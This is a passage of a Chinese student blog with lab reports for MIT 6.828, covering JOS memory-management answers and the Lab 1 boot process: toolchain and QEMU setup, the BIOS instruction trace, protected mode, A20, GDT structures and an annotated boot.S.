<td style="text-align:center">0xEF000000</td>
<td style="text-align:center">Pages</td>
</tr>
</tbody>
</table>
<p>问题3：<br>页保护机制实现了这一点，用户将不能访问未设置<code>PTE_U</code>的页（对于页目录和页表皆是如此）。</p>
<p>问题4：<br>注意到pages最多只有4MB，而一个<code>struct PageInfo</code>为8字节（对齐），所以实际上最多只有512K个项，总大小为2GB。</p>
<p>问题5：<br>使用了页表来管理虚拟内存，页表完整地映射了4GB的地址空间。使用pages追踪物理页面的情况，由于最初只映射了4MB，使得内存被限制在了2GB。</p>
<p>问题6：<br>执行转换的代码在<code>entry.S</code>中，和32位保护模式时相似：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>	$relocated, %eax</span><br><span class="line"><span class="keyword">jmp</span>	*%eax</span><br></pre></td></tr></table></figure><br>实际的跳转是通过一次<code>jmp</code>实现的，得以继续执行的原因是引导时不仅将0-4M映射到了<code>KERNBASE-KERNBASE+4M</code>的读写，同时也映射到了<code>0-4M</code>的只读。不这么做的话将出现无法处理的<code>SIGTRAP</code>信号而导致系统Triple Fault。<br>不通过转换就无法在高地址执行内核代码，将内核映射在高地址主要是为了完整地映射内核的约256M空间。</p>
<h2 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h2><p>最终执行<code>make grade</code>，评分脚本的输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">running JOS:</span><br><span class="line">$ make qemu-nox-gdb</span><br><span class="line">(1.3s)</span><br><span class="line">  Physical page allocator: OK</span><br><span class="line">  Page management: OK</span><br><span class="line">  Kernel page directory: OK</span><br><span class="line">  Page management 2: OK</span><br><span class="line">Score: 70/70</span><br></pre></td></tr></table></figure><br>至此，实验二结束。</p>
<p>第二个实验主要关注于操作系统的内存管理的基本概念，使用的也是简单的分配器，但是完整地描述了操作系统从引导直至内核初始化完毕是如何一步步设置页表，管理内存的。</p>
<p>由于已经在CSAPP（CMU 15213）中接触过相关的内存概念，本实验难度并不是很大。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2018/02/20/MIT6-828操作系统工程Lab2-Memory-Management实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/12/09/MIT6-828操作系统工程Lab1-Booting-a-PC实验报告/">
                            MIT6.828操作系统工程Lab1-Booting a PC实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-12-09T03:32:48+08:00">
	
		    12月 09, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/操作系统/">操作系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>本学期开设了操作系统的专业课。根据老师的介绍，下个学期的操作系统课设就是MIT的6.828的Labs，再加上团队老学长/同学的推荐，打算先在这个学期完成6.828，加深对于系统的理解。<br>Lab1 - Booting a PC是比较简单的实验，主要包括了引导、内核、控制台输出、以及栈。尽管如此，由于相关知识的缺失，我断断续续做了2周（2017年10月26日）才完成该实验。<br>2017年12月9日，完成了实验的提高部分并写完了报告。</p>
</blockquote>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>首先需要完成实验环境的搭建。实验环境主要由两个部分组成：QEMU用来模拟运行内核，以及一条编译工具链用于编译和测试内核。这里我使用的系统是64位的ArchLinux。</p>
<blockquote>
<p>本部分可以参考MIT 6.828官网的<a href="https://pdos.csail.mit.edu/6.828/2017/tools.html" target="_blank" rel="noopener">Tools</a>。</p>
</blockquote>
<h3 id="编译工具链"><a href="#编译工具链" class="headerlink" title="编译工具链"></a>编译工具链</h3><p>编译工具链包含了C编译器、汇编器、连接器，用于从源代码生成可执行二进制文件。本实验的目标代码是32位的Intel架构（x86），可执行文件格式为ELF。</p>
<p>在Arch Linux下，若是在安装时选择了base-devel包组，则gcc应该是系统自带的编译工具链。但是，该gcc默认不能编译生成32位的可执行文件。需要手动开启<a href="https://wiki.archlinux.org/index.php/multilib" target="_blank" rel="noopener">multilib</a>并安装gcc-multilib以及相关的软件包。</p>
<h4 id="GCC版本降级说明"><a href="#GCC版本降级说明" class="headerlink" title="GCC版本降级说明"></a>GCC版本降级说明</h4><p>在我和华田的Arch下，使用gcc 7.1.1-3之后的版本编译生成的JOS kernel均无法使用。在无法查明原因的情况下，推荐将gcc降级至7.1.1-3完成6.828的实验。</p>
<p>有关于Arch下软件包降级的教程请看<a href="https://wiki.archlinux.org/index.php/downgrading_packages" target="_blank" rel="noopener">这里</a>。</p>
<p>在后续的实验中，为了使得编译JOS内核的工具链不和系统工具链冲突以及为了保证系统工具链的最新，尝试了手动编译32位的gcc 4.6.1作为JOS专用的交叉编译工具链，并使用modules来管理环境变量，具体可以参考<a href="http://blog.codedragon.tech/2018/02/01/gcc4-6-1%E7%BC%96%E8%AF%91%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%E4%BB%A5%E5%8F%8Amodules%E7%9A%84%E4%BD%BF%E7%94%A8/">这里</a>。</p>
<h3 id="Qemu模拟器"><a href="#Qemu模拟器" class="headerlink" title="Qemu模拟器"></a>Qemu模拟器</h3><p>QEMU是一个现代并且快速的PC模拟器，但是为了与实验兼容，MIT推荐使用他们patched过的QEMU版本。需要按照Tools上的教程从源码编译并安装QEMU。</p>
<p>注意：提供的QEMU并不支持<code>make uninstall</code>，需要手动卸载QEMU。如果您对于手动编译并安装可能存在的<strong>后果</strong>抱有顾虑，推荐使用包管理软件安装QEMU，或是修改编译前缀，不要将编译好的qemu安装到<code>/usr/local/</code>下</p>
<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ol>
<li>所需要的库名可以在arch官网上通过搜索软件包的方式找到；</li>
<li>configure的时候加上–disable-werror以保证不会因出现编译警告而终止编译；</li>
<li><p>出现如下错误：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Unescaped left brace <span class="keyword">in</span> regex is illegal here <span class="keyword">in</span> regex; marked by &lt;-- HERE</span><br><span class="line"><span class="keyword">in</span> m/^\@strong&#123; &lt;-- HERE (.*)&#125;$/ at /home/guest/qemu/scripts/texi2pod.pl</span><br><span class="line">line 320.</span><br><span class="line"></span><br><span class="line">make: *** [Makefile:474：qemu.1] 错误 255。</span><br></pre></td></tr></table></figure>
<p> 该错误是由于perl版本更新后正则表达式语法的变动造成的，直接修改安装脚本的<code>/home/chenzhihao/qemu/scripts/texi2pod.pl line 320</code>，将<code>{</code>改成 <code>\{</code>即可；</p>
</li>
<li>configure时可能需要指定python版本为2以避免调用python3出现错误，参数为<code>--python=/usr/bin/python2.7</code>。</li>
</ol>
<h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>实验1总共分为3个部分：</p>
<ul>
<li>第1部分主要关注x86汇编语言、QEMU x86模拟器以及PC的上电启动流程；</li>
<li>第2部分主要关注6.828内核的引导程序；</li>
<li>第3部分开始挖掘6.828内核的最初模板 - JOS。</li>
</ul>
<p>实验使用Git进行版本管理，需要从MIT的Git克隆最开始的仓库，有关这一部分的具体说明请自行参考<a href="https://pdos.csail.mit.edu/6.828/2017/labs/lab1/" target="_blank" rel="noopener">Lab1实验讲义</a>。</p>
<p>有关于Git的教程推荐<a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">廖雪峰的官方博客</a>或者是<a href="https://www.gitbook.com/book/bingohuang/progit2/details" target="_blank" rel="noopener">Pro Git 2</a>。</p>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="第一部分-PC-Bootstrap-PC引导"><a href="#第一部分-PC-Bootstrap-PC引导" class="headerlink" title="第一部分 PC Bootstrap - PC引导"></a>第一部分 PC Bootstrap - PC引导</h3><h4 id="x86汇编"><a href="#x86汇编" class="headerlink" title="x86汇编"></a>x86汇编</h4><p>练习1：<br>本实验需要熟悉x86汇编。</p>
<p>8086汇编已经在王爽的《汇编语言》以及学院的汇编语言课程中学习过，x86_64汇编也已经在《深入理解计算机系统》中有所涉猎。本实验中使用的是i386汇编。这里不再赘述。</p>
<h4 id="模拟x86"><a href="#模拟x86" class="headerlink" title="模拟x86"></a>模拟x86</h4><p>在本实验中使用QEMU作为模拟器。尽管QEMU内置的监控只能提供少量的调试支持，但是QEMU却可以作为GNU-Debugging（GDB）的远程调试目标。</p>
<p>根据实验指导使用make编译生成内核并且用<code>make qemu</code>或者是<code>make qemu-nox</code>启动QEMU。可以看到，当前的内核仅支持两条命令help和kerninfo。</p>
<h4 id="PC的物理地址空间"><a href="#PC的物理地址空间" class="headerlink" title="PC的物理地址空间"></a>PC的物理地址空间</h4><p>PC的物理地址空间有着如下的布局：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB)</span><br><span class="line">|      32-bit      |</span><br><span class="line">|  memory mapped   |</span><br><span class="line">|     devices      |</span><br><span class="line">|                  |</span><br><span class="line">/\/\/\/\/\/\/\/\/\/\</span><br><span class="line"></span><br><span class="line">/\/\/\/\/\/\/\/\/\/\</span><br><span class="line">|                  |</span><br><span class="line">|      Unused      |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- depends on amount of RAM</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">| Extended Memory  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- 0x00100000 (1MB)</span><br><span class="line">|     BIOS ROM     |</span><br><span class="line">+------------------+  &lt;- 0x000F0000 (960KB)</span><br><span class="line">|  16-bit devices, |</span><br><span class="line">|  expansion ROMs  |</span><br><span class="line">+------------------+  &lt;- 0x000C0000 (768KB)</span><br><span class="line">|   VGA Display    |</span><br><span class="line">+------------------+  &lt;- 0x000A0000 (640KB)</span><br><span class="line">|                  |</span><br><span class="line">|    Low Memory    |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- 0x00000000</span><br></pre></td></tr></table></figure>
<p>最初的PC基于Intel的16位8088处理器，仅能够支持2^20B = 2^10KB = 1MB的寻址，早期的地址空间从0x00000开始到0xFFFFF结束。</p>
<ul>
<li>0x00000到0xA0000（640KB）被称作低内存，是早期PC能用的唯一的RAM；</li>
<li>0xA0000到0xFFFFF（384KB）被硬件保留作特殊用途如视频缓冲区或是固件，该部分最重要的区域是从0xF0000到0xFFFFF（64KB）的基本输入输出系统（BIOS）。BIOS用作执行最基本的系统初始化如激活显卡、检查内存等。在初始化完成后，BIOS从软盘、硬盘、光驱或是网络中读取操作系统，并且将机器控制权转移给操作系统。</li>
</ul>
<p>从Intel的80286到80386，处理器能够支持16MB和4GB的地址空间。但为了后向兼容性，硬件设计者保留了低1M内存的布局。<br>现代PC因此在0x000A0000到0x00100000的内存中有一个“洞”，这个洞将内存分为了低内存/保留内存（Low Memory）（低640KB）以及扩展内存（Extended Memory）（其他内存）。除此以外，32位PC的地址空间的最上方，常常被BIOS保留用作32位的PCI设备。</p>
<p>最新的x86处理器能够支持超过4GB的物理内存，因此内存可以超过0xFFFFFFFF。因此BIOS需要预留出第二个“洞”以保证那些32位的PCI设备的地址可以被正确的映射。</p>
<p>由于JOS只会使用256M内存，在此假设仅PC具有32位的地址空间。</p>
<h4 id="ROM-BIOS"><a href="#ROM-BIOS" class="headerlink" title="ROM BIOS"></a>ROM BIOS</h4><p>根据实验指导，进行QEMU和GDB的联合调试。会发现从上电开始，IBM PC从0x000ffff0开始执行指令。该处位于为BIOS预留的64kb的空间的顶层。此时CS = 0xf000 IP = 0xfff0。且第1条指令是一个jmp指令，跳转至CS = 0xf000 IP = 0xe05b。</p>
<p>这些都是早期的8088处理器的设计者设计的。这样的设计保证了BIOS总能控制机器。因为在刚上电的时候，在内存中并不存在能够执行的代码。</p>
<blockquote>
<p>此处需要理解8086的分段式寻址，即通过两个16位寄存器的值构造20位地址。实际地址为CS × 16 + IP = 0xf000 × 16 + 0xfff0 = 0xffff0。</p>
</blockquote>
<p>练习2：<br>使用gdb的<code>si</code>（单步调试）命令进入ROM BIOS并追踪几条指令，并猜测这些指令的作用。不需要指出指令具体的细节，只要理解BIOS一开始运行的核心思想而已。</p>
<p>BIOS执行的前若干条指令和作用如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[f000:fff0]    <span class="number">0xffff0</span>: ljmp   <span class="number">$0</span>xf000,<span class="number">$0</span>xe05b # 跳到一个较早的位置</span><br><span class="line">[f000:e05b]    <span class="number">0xfe05b</span>: cmpl   <span class="number">$0</span>x0,%cs:<span class="number">0x6ac8</span></span><br><span class="line">[f000:e062]    <span class="number">0xfe062</span>: <span class="keyword">jne</span>    <span class="number">0xfd2e1</span>         # 测试<span class="built_in">cs</span>段的<span class="number">0x6ac8</span>字是否为<span class="number">0</span>        </span><br><span class="line">[f000:e066]    <span class="number">0xfe066</span>: <span class="keyword">xor</span>    %dx,%dx         # 测试为<span class="number">0</span></span><br><span class="line">[f000:e068]    <span class="number">0xfe068</span>: <span class="keyword">mov</span>    %dx,%ss         </span><br><span class="line">[f000:e06a]    <span class="number">0xfe06a</span>: <span class="keyword">mov</span>    <span class="number">$0</span>x7000,%esp    # 设置栈段寄存器和栈指针寄存器</span><br><span class="line">                                               # 栈的延伸方向和代码段延伸方向相反</span><br><span class="line">[f000:e070]    <span class="number">0xfe070</span>: <span class="keyword">mov</span>    <span class="number">$0</span>xf34c2,%edx   # 设置<span class="built_in">edx</span>寄存器值</span><br><span class="line">[f000:e076]    <span class="number">0xfe076</span>: <span class="keyword">jmp</span>    <span class="number">0xfd15c</span>         # 跳转</span><br><span class="line">[f000:d15c]    <span class="number">0xfd15c</span>: <span class="keyword">mov</span>    %eax,%ecx       </span><br><span class="line">[f000:d15f]    <span class="number">0xfd15f</span>: <span class="keyword">cli</span>                    # 关闭硬件中断</span><br><span class="line">[f000:d160]    <span class="number">0xfd160</span>: <span class="keyword">cld</span>                    # 设置串传送指令方向</span><br><span class="line">[f000:d161]    <span class="number">0xfd161</span>: <span class="keyword">mov</span>    <span class="number">$0</span>x8f,%eax      </span><br><span class="line">[f000:d167]    <span class="number">0xfd167</span>: <span class="keyword">out</span>    %al,<span class="number">$0</span>x70       # 关闭不可屏蔽中断</span><br><span class="line">[f000:d169]    <span class="number">0xfd169</span>: <span class="keyword">in</span>     <span class="number">$0</span>x71,%al       # 从CMOS读取选择的寄存器</span><br><span class="line">[f000:d16b]    <span class="number">0xfd16b</span>: <span class="keyword">in</span>     <span class="number">$0</span>x92,%al       # 读取系统控制端口A</span><br><span class="line">[f000:d16d]    <span class="number">0xfd16d</span>: <span class="keyword">or</span>     <span class="number">$0</span>x2,%al        </span><br><span class="line">[f000:d16f]    <span class="number">0xfd16f</span>: <span class="keyword">out</span>    %al,<span class="number">$0</span>x92       # 通过快速A20以启动A20</span><br><span class="line">[f000:d171]    <span class="number">0xfd171</span>: lidtw  %cs:<span class="number">0x6ab8</span>      # 将<span class="built_in">cs</span>:<span class="number">0x6ab8</span>加载进入IDT表</span><br><span class="line">[f000:d177]    <span class="number">0xfd177</span>: lgdtw  %cs:<span class="number">0x6a74</span>      # 将<span class="built_in">cs</span>:<span class="number">0x6a74</span>加载进入GDT表</span><br><span class="line">[f000:d17d]    <span class="number">0xfd17d</span>: <span class="keyword">mov</span>    %cr0,%eax   </span><br><span class="line">[f000:d180]    <span class="number">0xfd180</span>: <span class="keyword">or</span>     <span class="number">$0</span>x1,%eax       </span><br><span class="line">[f000:d184]    <span class="number">0xfd184</span>: <span class="keyword">mov</span>    %eax,%cr0       # 将<span class="built_in">cr0</span>寄存器的保护模式位打开</span><br><span class="line">[f000:d187]    <span class="number">0xfd187</span>: ljmpl  <span class="number">$0</span>x8,<span class="number">$0</span>xfd18f   # 通过ljmp指令进入保护模式</span><br><span class="line">=&gt; <span class="number">0xfd18f</span>:     <span class="keyword">mov</span>    <span class="number">$0</span>x10,%eax              # 设置段寄存器</span><br><span class="line">=&gt; <span class="number">0xfd194</span>:     <span class="keyword">mov</span>    %eax,%ds</span><br><span class="line">=&gt; <span class="number">0xfd196</span>:     <span class="keyword">mov</span>    %eax,%es  </span><br><span class="line">=&gt; <span class="number">0xfd198</span>:     <span class="keyword">mov</span>    %eax,%ss</span><br><span class="line">=&gt; <span class="number">0xfd19a</span>:     <span class="keyword">mov</span>    %eax,%fs</span><br><span class="line">=&gt; <span class="number">0xfd19c</span>:     <span class="keyword">mov</span>    %eax,%gs</span><br><span class="line">=&gt; <span class="number">0xfd19e</span>:     <span class="keyword">mov</span>    %ecx,%eax  </span><br><span class="line">=&gt; <span class="number">0xfd1a0</span>:     <span class="keyword">jmp</span>    *%edx                   # 跳转</span><br></pre></td></tr></table></figure></p>
<h3 id="第二部分-引导"><a href="#第二部分-引导" class="headerlink" title="第二部分 引导"></a>第二部分 引导</h3><p>软盘和硬盘被分为了512Bytes的区域 - 扇区（Sector）。一个扇区是磁盘传输的最小粒度：每一个读操作和写操作必须是一个或是一个以上的扇区，并且必须要对齐到扇区。</p>
<p>如果一个磁盘是可引导的，那么它的第一个扇区就被称作引导扇区，引导代码就存储在引导扇区中。如果BIOS发现了一个可引导的硬件，那么它就将这个扇区从磁盘读取至内存的0x7c00到0x7dff处，并且使用一个jmp指令设置CS：IP = 0000:7C00，将控制传递给引导。和BIOS读取地址一样，这个地址对于PC来说是固定和标准化的。</p>
<blockquote>
<p>从光盘引导的情形更加复杂，因为光盘的一个扇区为2048Byte，BIOS可以从硬盘读取一个更大的引导镜像到内存中。</p>
</blockquote>
<p>在6.828中，使用硬盘的传统引导机制。这意味这引导必须满足512个Bytes的限制。引导由一个汇编文件boot/boot.S，以及一个C语言文件boot/main.c组成。</p>
<p>练习3：追踪boot.S和main.C，分析每一个部分的作用。</p>
<hr>
<p>为了理解boot.S，需要以下的知识储备。</p>
<h4 id="实模式和保护模式"><a href="#实模式和保护模式" class="headerlink" title="实模式和保护模式"></a>实模式和保护模式</h4><p>实模式是为了与8086兼容而设置的。在实模式下，处理器相当于一个快速的8086处理器。当处理器被加电或者复位时以实模式启动。</p>
<ul>
<li>实模式下各寄存器以实模式的初始化值工作；</li>
<li>实模式的地址空间总共为20位（1MB）；</li>
<li>实模式下不支持内存分页机制；</li>
<li>实模式下各内存段均是可读、可写、可执行的，不支持指令优先级，所有的指令均运行在特权级；</li>
<li>实模式不支持多任务切换；</li>
<li>实模式的中断处理也和8086相同，使用中断向量表来定位中断服务程序。</li>
</ul>
<p>在保护模式下，处理器的所有功能都是可用的。具体来说：</p>
<ul>
<li>保护模式提供了完全的32位地址空间，寻址空间为4GB；</li>
<li>保护模式支持内存分页机制，提供了对虚拟内存的硬件支持；</li>
<li>保护模式的处理器支持多任务（上下文切换）；</li>
<li>保护模式的处理器支持指令和数据的特权级，配合边界检查等机制，既可以共享数据也可以隔离各个任务。</li>
</ul>
<p>为了保证后向兼容性，x86的处理器启动时默认是实模式，需要手动从实模式切换至保护模式。但是切换至保护模式之前需要做一些必要的准备工作，如打开A20和建立全局描述符表等。</p>
<h4 id="A20地址线"><a href="#A20地址线" class="headerlink" title="A20地址线"></a>A20地址线</h4><p>在早期的PC上处理器仅支持20位的地址空间，任何超过20位的地址都会被卷回。<br>例如：0xFFFF+0xFFFF = 0x1FFFE -&gt; 0xFFFE</p>
<p>然而，从80286开始，Intel支持了24位的地址空间，上例的地址相加将不会发生卷回。<br>为了保证与早期PC的完全兼容，Intel采用了“黑魔法” - 将A20（第21根）地址线与键盘控制器的一个输出进行了与运算。进而控制A20地址线的值。</p>
<p>默认情况下，A20是置0的，PC将只能访问1M、3M、5M…这样的奇数段。进入保护模式前需要先打开A20以获得完全的寻址能力。</p>
<p>JOS内核通过端口的方式与键盘控制器进行通信并打开A20。可以参考Reference中的<a href="http://www.computer-engineering.org/ps2keyboard/" target="_blank" rel="noopener">PS/2 Keyboard Interface</a>。</p>
<ul>
<li>8042有一个1 Byte的输入缓冲区，一个1 Byte的输出缓冲区、一个1 Byte的状态寄存器、以及一个1 Byte的控制寄存器。前三个寄存器可以直接从0x60和0x64端口进行访问。最后一个寄存器通过“Read Command Byte”命令进行读，通过“Write Command Byte”命令进行写。</li>
<li>对0x60端口读会读输入缓冲区；对0x60端口写会写输出缓冲区；对0x64端口读会读状态寄存器；对0x64端口写会发送命令。</li>
<li>状态寄存器的Bit1为IBF - Input Buffer Full，当该Bit为1时，输入缓冲区满，不能对0x60端口或0x64端口写。</li>
<li>对0x64端口写0xd1发送的命令是“Write Output Port”写输出端口，表明将参数写入输出端口（0x60端口写）。</li>
<li>A20使用的是键盘控制器输出的Bit 1，向输出端口写入0xdf可以打开A20；向输出端口写入0xdd则会关闭A20。</li>
</ul>
<h4 id="分段机制与全局描述符表"><a href="#分段机制与全局描述符表" class="headerlink" title="分段机制与全局描述符表"></a>分段机制与全局描述符表</h4><p>x86处理器提供了分段机制和分页机制两种内存管理模式。如果要进入保护模式，就必须要先启动分段机制。（分页机制不是必须的）</p>
<p>分段机制将内存划分为若干个段，每个段都由段基址、段界限和段属性组成。由一个段描述符表（可以理解为一个数组）描述所有段的信息。段描述符表可以是全局的也可以是局部的。</p>
<p>简化的说，程序首先将对应的段选择子（可以理解为数组的索引）加载进入段寄存器中。然后在执行程序时，根据指令的内容确定应该使用的段寄存器，根据段寄存器中的段选择子确定应该使用的段描述符。再结合段描述符中包含的信息加上指令自身的地址构造出实际的物理地址。最终将该地址发送到地址总线上，到物理内存中寻址，并取回相应的数据。这之中简化了有关特权级、边界检查的相关内容，但足以描述分段机制的基本原理。</p>
<p>分段机制将虚拟地址转换成了线性地址。</p>
<h5 id="全局描述符表寄存器"><a href="#全局描述符表寄存器" class="headerlink" title="全局描述符表寄存器"></a>全局描述符表寄存器</h5><p>x86处理器提供了专门的全局描述符表寄存器（Global Descriptor Table Register）用于保存全局描述符表的表基址和表限长。GDTR由2个字节的表限长（limit）和4个字节的表基址（base）组成。其中表基址指定了全局描述符表的起始地址，表限长指定了全局描述符表的大小。其C结构体描述如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdtr</span> &#123;</span></span><br><span class="line">	u16 limite;</span><br><span class="line">	u32 base;</span><br><span class="line">&#125; __attribute__ ((packed));</span><br></pre></td></tr></table></figure></p>
<p>在机器刚加电或者是处理器复位后，表基址默认被置为0，表限长则默认被置为0xFFFF。在保护模式初始化的过程中，必须给GDTR加载新的值。可以使用lgdt指令为GDTR加载新值。</p>
<h5 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h5><p>段选择子（2个字节）用于选择特定的描述符表以及表中的特定描述符。段选择子一般被放置于段寄存器中，段选择子由13位的索引、1位的表指示位和2位的请求特权级三部分组成。其中索引指定了描述符，表指示位选择应该访问的描述符表 - 0代表全局描述符表，1代表局部描述符表，请求特权级用于段级的保护机制，自0到4分别代表ring 0到ring 3。其C结构体描述如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">selector</span> &#123;</span></span><br><span class="line">    u16 index:<span class="number">13</span>;</span><br><span class="line">    u16 ti:<span class="number">1</span>;</span><br><span class="line">    u16 rpl:<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h5 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h5><p>段描述符（8个字节）是段描述符表这个“数组”的“元素”。用C结构体描述如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdtdesc</span> &#123;</span></span><br><span class="line">	u16 lim0_15;</span><br><span class="line">	u16 base0_15;</span><br><span class="line">	u8 base16_23;</span><br><span class="line">	u8 acces;</span><br><span class="line">	u8 lim16_19:<span class="number">4</span>;</span><br><span class="line">	u8 other:<span class="number">4</span>;</span><br><span class="line">	u8 base24_31;</span><br><span class="line">&#125; __attribute__ ((packed));</span><br></pre></td></tr></table></figure></p>
<p>其中总共包含了32位的段基址、20位的段界限、以及12位的类型。<br>段基址规定了段的起始地址。段界限规定了段的大小。而类型用于区别不同类型的描述符。包括描述符特权级、段存在位、已访问位等等。</p>
<h4 id="boot-S代码详解"><a href="#boot-S代码详解" class="headerlink" title="boot.S代码详解"></a>boot.S代码详解</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;<span class="keyword">inc</span>/mmu.h&gt;</span><br><span class="line"></span><br><span class="line"># Start the <span class="meta">CPU</span>: switch to <span class="number">32</span>-bit protected mode, jump <span class="keyword">into</span> C.</span><br><span class="line"># The BIOS loads this code from the first sector of the hard disk <span class="keyword">into</span></span><br><span class="line"># memory <span class="meta">at</span> physical address <span class="number">0x7c00</span> <span class="keyword">and</span> starts executing <span class="keyword">in</span> real mode</span><br><span class="line"># with %cs=<span class="number">0</span> %ip=7c00.</span><br><span class="line"># boot.S 主要将<span class="meta">CPU</span>切换至<span class="number">32</span>位保护模式，并且跳转进入C代码</span><br><span class="line"></span><br><span class="line"><span 